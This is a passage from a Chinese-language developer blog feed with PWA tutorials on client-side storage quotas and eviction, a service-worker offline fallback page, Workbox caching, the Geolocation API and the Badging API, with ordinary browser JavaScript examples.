        <content type="html"><![CDATA[<h2 id="什麼是用戶端儲存-Client-side-storage"><a href="#什麼是用戶端儲存-Client-side-storage" class="headerlink" title="什麼是用戶端儲存 (Client-side storage)"></a>什麼是用戶端儲存 (Client-side storage)</h2><p>對一個 App 來說，為了達到某些目的，將相關資料存在用戶端是相對方便的，舉例來說</p><ul><li>個人偏好設定，像是常用功能、顏色主題、字體大小</li><li>將前一次操作快取，像是紀錄購物車資料或是線上編輯器在斷線時先暫時將資料保存</li><li>不常改變的資料或靜態資源快取</li><li>離線操作所需要的檔案</li></ul><p>通常用戶端的儲存和伺服器端的儲存會是一起搭配使用的，舉例來說當我們使用影音串流功能時，會從伺服器端下載相關資料到用戶端使用，在過程中 App 也能夠將資料快取起來以便下次使用。</p><p>不過在實務上，瀏覽器用戶端的儲存目前有各式解決方案，也都有著各自的限制存在，如果是有大小限制的儲存，就必須注意定時和伺服器端同步去避免資料遺失。</p><h2 id="常見用戶端儲存機制介紹"><a href="#常見用戶端儲存機制介紹" class="headerlink" title="常見用戶端儲存機制介紹"></a>常見用戶端儲存機制介紹</h2><p>目前常見的用戶端儲存機制如下:</p><ul><li>Cookies: 每次發 Request 都會一起送出，所以要大小控制要注意</li><li>Web Storage API<ul><li>SessionStorage: 同步阻塞 (synchronous)，上限 5MB，僅存在於 Tab 當次操作，無法被 web workers 或 service workers 使用</li><li>LocalStorage: 同步阻塞 (synchronous)，上限 5MB，無法被 web workers 或 service workers 使用</li></ul></li><li>Cache API: 非同步，較適合跟網路請求相關的靜態資源快取</li><li>IndexedDB API: 非同步，適合儲存程式邏輯相關資料，使用上相對複雜，較推薦使用像是 <a href="https://www.npmjs.com/package/idb">idb</a> 這類相關套件操作</li><li>WebSQL: 不建議使用</li></ul><h2 id="用戶端儲存限制"><a href="#用戶端儲存限制" class="headerlink" title="用戶端儲存限制"></a>用戶端儲存限制</h2><p>一般來說儲存空間的上限如下:</p><ul><li>Chrome 總共最多可以用到 80% 的硬碟，每個網域最高是 60%</li><li>IE 系列 10 以後最多 250MB</li><li>Firefox 硬碟空間的 50%</li><li>Safari 1GB</li></ul><p>在 Chrome、Firefox、Edge 等瀏覽器中可以使用以下的程式碼去估計剩餘空間:</p><p><a href="https://caniuse.com/mdn-api_storagemanager">https://caniuse.com/mdn-api_storagemanager</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (navigator.<span class="property">storage</span> &amp;&amp; navigator.<span class="property">storage</span>.<span class="property">estimate</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> quota = <span class="keyword">await</span> navigator.<span class="property">storage</span>.<span class="title function_">estimate</span>();</span><br><span class="line">  <span class="comment">// quota.usage -&gt; 用了多少 bytes</span></span><br><span class="line">  <span class="comment">// quota.quota -&gt; 還剩多少 bytes 可使用</span></span><br><span class="line">  <span class="keyword">const</span> percentageUsed = (quota.<span class="property">usage</span> / quota.<span class="property">quota</span>) * <span class="number">100</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;percentageUsed&#125;</span>% 已使用`</span>);</span><br><span class="line">  <span class="keyword">const</span> remaining = quota.<span class="property">quota</span> - quota.<span class="property">usage</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`還可以寫入 <span class="subst">$&#123;remaining&#125;</span> bytes`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="QuotaExceededError-錯誤處理"><a href="#QuotaExceededError-錯誤處理" class="headerlink" title="QuotaExceededError 錯誤處理"></a>QuotaExceededError 錯誤處理</h3><ul><li>IndexedDB</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> transaction = idb.<span class="title function_">transaction</span>([<span class="string">&quot;entries&quot;</span>], <span class="string">&quot;readwrite&quot;</span>);</span><br><span class="line">transaction.<span class="property">onabort</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> error = event.<span class="property">target</span>.<span class="property">error</span>; <span class="comment">// DOMException</span></span><br><span class="line">  <span class="keyword">if</span> (error.<span class="property">name</span> == <span class="string">&quot;QuotaExceededError&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 錯誤處理</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>Cache API</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> cache = <span class="keyword">await</span> caches.<span class="title function_">open</span>(<span class="string">&quot;my-cache&quot;</span>);</span><br><span class="line">  <span class="keyword">await</span> cache.<span class="title function_">add</span>(<span class="keyword">new</span> <span class="title class_">Request</span>(<span class="string">&quot;/test.jpg&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="keyword">if</span> (error.<span class="property">name</span> === <span class="string">&quot;QuotaExceededError&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 錯誤處理</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="儲存淘汰機制-eviction"><a href="#儲存淘汰機制-eviction" class="headerlink" title="儲存淘汰機制 (eviction)"></a>儲存淘汰機制 (eviction)</h2><p>資料在儲存上會分成兩種類別</p><ul><li>Best Effort: 當瀏覽器空間不足，會開始執行淘汰機制<ul><li>Chromium: 從最少使用的開始，會自動清除資料且不會通知用戶</li><li>Firefox: 從最少使用的開始，會自動清除資料且不會通知用戶</li><li>Internet Explorer 10+ 不會清除，但會停止寫入</li></ul></li><li>Persistent: 不會被自動清除</li></ul><h3 id="LRU-policy"><a href="#LRU-policy" class="headerlink" title="LRU policy"></a>LRU policy</h3><p>當硬碟空間即將用完時，瀏覽器會依據 LRU policy (least recently used) 的規則透過去清除快取檔案。</p><ol><li>目前沒有使用的網頁 (tabs&#x2F;apps)</li><li>比對最後存取的時間</li></ol><h3 id="Persistent-Storage"><a href="#Persistent-Storage" class="headerlink" title="Persistent Storage"></a>Persistent Storage</h3><p>為了避免資料被儲存淘汰機制處理掉，我們能夠通過程式碼去確認、啟用 Persistent Storage。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 確認目前儲存空間是否套用 Persistent</span></span><br><span class="line"><span class="keyword">if</span> (navigator.<span class="property">storage</span> &amp;&amp; navigator.<span class="property">storage</span>.<span class="property">persist</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> isPersisted = <span class="keyword">await</span> navigator.<span class="property">storage</span>.<span class="title function_">persisted</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Persisted storage granted: <span class="subst">$&#123;isPersisted&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 針對這個站台啟用 Persistent Storage</span></span><br><span class="line"><span class="keyword">if</span> (navigator.<span class="property">storage</span> &amp;&amp; navigator.<span class="property">storage</span>.<span class="property">persist</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> isPersisted = <span class="keyword">await</span> navigator.<span class="property">storage</span>.<span class="title function_">persist</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Persisted storage granted: <span class="subst">$&#123;isPersisted&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>啟用過後底下的儲存皆會受到保護，但要注意啟用後目前尚沒有透過程式停用的方式。</p><ul><li>Cache API</li><li>Cookies</li><li>DOM Storage (Local Storage)</li><li>File System API</li><li>IndexedDB</li><li>Service workers</li><li>App Cache (deprecated)</li><li>WebSQL (deprecated)</li></ul><h2 id="離線後備頁面介紹-offline-fallback-page"><a href="#離線後備頁面介紹-offline-fallback-page" class="headerlink" title="離線後備頁面介紹 (offline fallback page)"></a>離線後備頁面介紹 (offline fallback page)</h2><p>離線後備頁面提供用戶在網路不穩定的情況下，一個備援的顯示頁面。</p><p>在過去的網站大多由伺服器提供，所以斷線的情況下原則上就是什麼都沒有，近幾年 JavaScript 相關的進步以及 SPA 觀念開始盛行後，前端能夠掌握的事情也越來越多，離線後備頁面 (offline fallback page) 一個有名的例子就是 Chrome 在斷線狀態下的小恐龍遊戲。</p><blockquote><p>圖片來源: <a href="https://web.dev/">https://web.dev/</a><br><img src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/vrqfLVP132LcydIWcYbh.png?auto=format&w=964"></p></blockquote><h2 id="離線後備頁面實作"><a href="#離線後備頁面實作" class="headerlink" title="離線後備頁面實作"></a>離線後備頁面實作</h2><p>對 Progressive Web App 來說，目前最佳的實作方式就是透過 service worker 搭配 Cache Storage API 來提供用戶最佳的離線操作體驗。</p><p>接下來會示範一個簡單的情境，當用戶網路斷線時，會自動開啟離線後備頁面，頁面中一方面提供重試的按鈕，另一方面也透過程式實作當網路恢復時自動連線並切換回正常的頁面。</p><p>Google 的這個範例主要會有三個頁面加上 service worker 實作:</p><ol><li>連線正常的第一頁</li><li>連線正常的第二頁</li><li>離線後備頁面</li><li>service worker: 偵測到斷線時會將第一頁或第二頁切換到離線後備頁面</li></ol><p>Demo 站台:<br><a href="https://linyencheng.github.io/pwa-offline-fallback/">https://linyencheng.github.io/pwa-offline-fallback/</a></p><p>原始碼:<br><a href="https://github.com/LinYenCheng/pwa-offline-fallback/tree/main/docs">https://github.com/LinYenCheng/pwa-offline-fallback/tree/main/docs</a></p><h3 id="service-worker-離線後備頁面實作"><a href="#service-worker-離線後備頁面實作" class="headerlink" title="service worker 離線後備頁面實作"></a>service worker 離線後備頁面實作</h3><ol><li>宣告常數</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 這次 Cache 存放的名稱</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CACHE_NAME</span> = <span class="string">&quot;offline&quot;</span>;</span><br><span class="line"><span class="comment">// 離線後備頁面檔名</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">OFFLINE_URL</span> = <span class="string">&quot;offline.html&quot;</span>;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>install</code>: 命名快取空間為 <code>CACHE_NAME</code> 並加入 <code>OFFLINE_URL</code> 快取，透過 <code>self.skipWaiting()</code> 跳過等待重啟生效。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;install&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  event.<span class="title function_">waitUntil</span>(</span><br><span class="line">    (<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="comment">// 使用 CACHE_NAME</span></span><br><span class="line">      <span class="keyword">const</span> cache = <span class="keyword">await</span> caches.<span class="title function_">open</span>(<span class="variable constant_">CACHE_NAME</span>);</span><br><span class="line">      <span class="comment">// Setting &#123;cache: &#x27;reload&#x27;&#125; in the new request will ensure that the response</span></span><br><span class="line">      <span class="comment">// isn&#x27;t fulfilled from the HTTP cache; i.e., it will be from the network.</span></span><br><span class="line">      <span class="keyword">await</span> cache.<span class="title function_">add</span>(<span class="keyword">new</span> <span class="title class_">Request</span>(<span class="variable constant_">OFFLINE_URL</span>, &#123; <span class="attr">cache</span>: <span class="string">&quot;reload&quot;</span> &#125;));</span><br><span class="line">    &#125;)()</span><br><span class="line">  );</span><br><span class="line">  <span class="comment">// Force the waiting service worker to become the active service worker.</span></span><br><span class="line">  self.<span class="title function_">skipWaiting</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li><code>activate</code>: 透過 <code>self.clients.claim()</code> 讓 Service Worker 直接生效</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;activate&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  event.<span class="title function_">waitUntil</span>(</span><br><span class="line">    (<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="comment">// Enable navigation preload if it&#x27;s supported.</span></span><br><span class="line">      <span class="comment">// See https://developers.google.com/web/updates/2017/02/navigation-preload</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;navigationPreload&quot;</span> <span class="keyword">in</span> self.<span class="property">registration</span>) &#123;</span><br><span class="line">        <span class="keyword">await</span> self.<span class="property">registration</span>.<span class="property">navigationPreload</span>.<span class="title function_">enable</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell the active service worker to take control of the page immediately.</span></span><br><span class="line">  self.<span class="property">clients</span>.<span class="title function_">claim</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="4"><li><code>fetch</code>: 遇到連線錯誤則使用 <code>CACHE_NAME</code> 中的 <code>OFFLINE_URL</code> 的快取</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// We only want to call event.respondWith() if this is a navigation request</span></span><br><span class="line">  <span class="comment">// for an HTML page.</span></span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">request</span>.<span class="property">mode</span> === <span class="string">&quot;navigate&quot;</span>) &#123;</span><br><span class="line">    event.<span class="title function_">respondWith</span>(</span><br><span class="line">      (<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// First, try to use the navigation preload response if it&#x27;s supported.</span></span><br><span class="line">          <span class="keyword">const</span> preloadResponse = <span class="keyword">await</span> event.<span class="property">preloadResponse</span>;</span><br><span class="line">          <span class="keyword">if</span> (preloadResponse) &#123;</span><br><span class="line">            <span class="keyword">return</span> preloadResponse;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Always try the network first.</span></span><br><span class="line">          <span class="keyword">const</span> networkResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(event.<span class="property">request</span>);</span><br><span class="line">          <span class="keyword">return</span> networkResponse;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          <span class="comment">// catch is only triggered if an exception is thrown, which is likely</span></span><br><span class="line">          <span class="comment">// due to a network error.</span></span><br><span class="line">          <span class="comment">// If fetch() returns a valid HTTP response with a response code in</span></span><br><span class="line">          <span class="comment">// the 4xx or 5xx range, the catch() will NOT be called.</span></span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Fetch failed; returning offline page instead.&quot;</span>, error);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> cache = <span class="keyword">await</span> caches.<span class="title function_">open</span>(<span class="variable constant_">CACHE_NAME</span>);</span><br><span class="line">          <span class="keyword">const</span> cachedResponse = <span class="keyword">await</span> cache.<span class="title function_">match</span>(<span class="variable constant_">OFFLINE_URL</span>);</span><br><span class="line">          <span class="keyword">return</span> cachedResponse;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)()</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If our if() condition is false, then this fetch handler won&#x27;t intercept the</span></span><br><span class="line">  <span class="comment">// request. If there are any other fetch handlers registered, they will get a</span></span><br><span class="line">  <span class="comment">// chance to call event.respondWith(). If no fetch handlers call</span></span><br><span class="line">  <span class="comment">// event.respondWith(), the request will be handled by the browser as if there</span></span><br><span class="line">  <span class="comment">// were no service worker involvement.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="離線後備頁面"><a href="#離線後備頁面" class="headerlink" title="離線後備頁面"></a>離線後備頁面</h2><p>因為是離線後備頁面，所以我們會需要把所有的資源都快取起來，其中最簡單的方式就是將所有需要的東西都用 inline 的方式寫在 html 中，若是想要自己去實作較複雜的快取機制，比較建議取使用 workbox 這套工具。</p><p>參考連結:<br><a href="https://developers.google.com/web/tools/workbox/guides/advanced-recipes#offline_page_only">https://developers.google.com/web/tools/workbox/guides/advanced-recipes#offline_page_only</a></p><ul><li>可依照情境使用不同的快取策略: <code>import &#123;CacheFirst, NetworkFirst, StaleWhileRevalidate&#125; from &#39;workbox-strategies&#39;;</code></li><li>文件中有提供範例可參考修改，底下的例子說明怎麼把 mp4 相關資源快取</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; registerRoute &#125; <span class="keyword">from</span> <span class="string">&quot;workbox-routing&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CacheFirst</span> &#125; <span class="keyword">from</span> <span class="string">&quot;workbox-strategies&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CacheableResponsePlugin</span> &#125; <span class="keyword">from</span> <span class="string">&quot;workbox-cacheable-response&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">RangeRequestsPlugin</span> &#125; <span class="keyword">from</span> <span class="string">&quot;workbox-range-requests&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 mp4 相關資源都快取起來</span></span><br><span class="line"><span class="title function_">registerRoute</span>(</span><br><span class="line">  <span class="function">(<span class="params">&#123; url &#125;</span>) =&gt;</span> url.<span class="property">pathname</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.mp4&quot;</span>),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">CacheFirst</span>(&#123;</span><br><span class="line">    <span class="attr">cacheName</span>: <span class="string">&quot;your-cache-name-here&quot;</span>,</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">CacheableResponsePlugin</span>(&#123; <span class="attr">statuses</span>: [<span class="number">200</span>] &#125;),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">RangeRequestsPlugin</span>(),</span><br><span class="line">    ],</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 位置存取</title>
      <link href="/2021/09/15/progressive-web-application/pwa-geo-location-api/"/>
      <url>/2021/09/15/progressive-web-application/pwa-geo-location-api/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Geolocation-API"><a href="#什麼是-Geolocation-API" class="headerlink" title="什麼是 Geolocation API?"></a>什麼是 Geolocation API?</h2><p>透過 Geolocation API 可以讓 Progressive Web App 存取用戶的位置，方便實作地理資訊相關應用。</p><h2 id="怎麼使用-Geolocation-API"><a href="#怎麼使用-Geolocation-API" class="headerlink" title="怎麼使用 Geolocation API?"></a>怎麼使用 Geolocation API?</h2><ol><li>檢查支援度，然後針對支援的部分做漸進式增強，如果不支援的話可以使用 <a href="https://www.geojs.io/">GEO IP 相關服務</a>，雖然較不準確，但仍然有一定的參考價值。<ul><li><code>https://get.geojs.io/v1/ip/geo.json</code></li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (navigator.<span class="property">geolocation</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Geolocation is supported!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Geolocation is not supported for this Browser/OS.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用 <code>navigator.geolocation.getCurrentPosition</code> 一次性取得用戶地理位置資訊。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> startPos;</span><br><span class="line"><span class="keyword">var</span> geoSuccess = <span class="keyword">function</span> (<span class="params">position</span>) &#123;</span><br><span class="line">  startPos = position;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">    <span class="string">&quot;lat&quot;</span>,</span><br><span class="line">    startPos.<span class="property">coords</span>.<span class="property">latitude</span>,</span><br><span class="line">    <span class="string">&quot;lng&quot;</span>,</span><br><span class="line">    startPos.<span class="property">coords</span>.<span class="property">longitude</span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line">navigator.<span class="property">geolocation</span>.<span class="title function_">getCurrentPosition</span>(geoSuccess);</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 <code>navigator.geolocation.watchPosition</code> 持續追蹤用戶地理位置資訊<ul><li>enableHighAccuracy: 啟用後解析速度會下降，並且電池耗電會增加</li><li>timeout: 避免讓用戶等太久，所以設置 timeout，超過就會跑錯誤處理</li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> id, target, options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">success</span>(<span class="params">pos</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> crd = pos.<span class="property">coords</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (target.<span class="property">latitude</span> === crd.<span class="property">latitude</span> &amp;&amp; target.<span class="property">longitude</span> === crd.<span class="property">longitude</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成功追蹤&quot;</span>);</span><br><span class="line">    navigator.<span class="property">geolocation</span>.<span class="title function_">clearWatch</span>(id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">error</span>(<span class="params">err</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;ERROR(&quot;</span> + err.<span class="property">code</span> + <span class="string">&quot;): &quot;</span> + err.<span class="property">message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target = &#123;</span><br><span class="line">  <span class="attr">latitude</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">longitude</span>: <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">options = &#123;</span><br><span class="line">  <span class="attr">enableHighAccuracy</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">maximumAge</span>: <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">id = navigator.<span class="property">geolocation</span>.<span class="title function_">watchPosition</span>(success, error, options);</span><br></pre></td></tr></table></figure><ol start="4"><li>不需要持續追蹤的時候，要記得使用 <code>clearWatch</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">geolocation</span>.<span class="title function_">clearWatch</span>(id);</span><br></pre></td></tr></table></figure><h2 id="請求權限"><a href="#請求權限" class="headerlink" title="請求權限"></a>請求權限</h2><p>讓使用者同意位置共用的時機，在 App 啟動時就請求權限會是最爛的時機，而且對於在頁面載入時要求提供位置的網站，用戶通常會不信任。</p><p>在 Android 5.0 之後的實作上也是在要使用時才會向使用者請求權限，所以在實作上要假設:</p><ul><li>假設使用者不會提供位置</li><li>說明為什麼需要存取使用者位置</li></ul><p>在用戶使用特定功能時才讓用戶主動操作並出現提示，且要準備好使用被拒絕的備案。</p><blockquote><p>圖片來源: <a href="https://developers.google.com/">https://developers.google.com/</a><br><img src="https://developers.google.com/web/fundamentals/native-hardware/user-location/images/sw-navigation-good.png"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 通知數字</title>
      <link href="/2021/09/10/progressive-web-application/pwa-badging-for-app-icon/"/>
      <url>/2021/09/10/progressive-web-application/pwa-badging-for-app-icon/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Badging-API"><a href="#什麼是-Badging-API" class="headerlink" title="什麼是 Badging API"></a>什麼是 Badging API</h2><p>Badging API 讓 App 能夠顯示通知數字，不過通知數字的位置會依照平台的不同而有所差異。</p><ul><li>常見是用來通知用戶，像是訊息或是推播數量都能夠透過這個通知數字來實現<ul><li>Email 未讀、訊息未讀</li><li>待辦事項</li><li>遊戲任務</li></ul></li><li>不需要任何使用者權限即可使用</li><li>支援 Windows、macOS、Chrome 81+、Edge 84+</li></ul><blockquote><p>Badging API (圖片來源: <a href="https://web-dev/">https://web-dev</a>)<br><img src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/t7XqI06whZr4oJe0yawc.jpg?auto=format&w=845"></p></blockquote><h2 id="Badging-API-推播網頁實做"><a href="#Badging-API-推播網頁實做" class="headerlink" title="Badging API 推播網頁實做"></a>Badging API 推播網頁實做</h2><p>其實實作上蠻容易的，就是只要有 API 存在就可以設定，沒有則代表不行。</p><ol><li>App 需要被安裝，被安裝過後就會出現在 App 列表中</li></ol><ul><li>可以用手機或電腦打開後點選安裝 <a href="https://linyencheng.github.io/progressive-web-application/pwa-badging-api/">https://linyencheng.github.io/progressive-web-application/pwa-badging-api/</a></li></ul><ol start="2"><li>開啟 PWA 測試 Badging API</li></ol><ul><li>直接叫用設定</li><li>透過 Service Worker 叫用設定</li></ul><p>注意事項</p><ul><li>99 以上會被改成 99+ 